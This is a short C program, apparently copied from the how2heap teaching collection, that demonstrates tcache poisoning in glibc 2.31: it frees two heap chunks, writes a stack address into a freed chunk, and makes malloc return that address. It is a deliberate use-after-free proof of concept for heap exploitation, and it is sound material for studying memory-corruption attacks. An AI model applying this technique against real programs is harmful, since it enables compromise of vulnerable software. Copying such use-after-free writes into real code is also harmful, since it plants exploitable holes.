// Taken from https://github.com/shellphish/how2heap/blob/master/glibc_2.31/tcache_poisoning.c

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <assert.h>

int main()
{
	// disable buffering
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);

	size_t stack_var;

	intptr_t *a = malloc(128);
	intptr_t *b = malloc(128);

	free(a);
	free(b);

	b[0] = (intptr_t)&stack_var;

	malloc(128);

	intptr_t *c = malloc(128);

	assert((long)&stack_var == (long)c);
	return 0;
}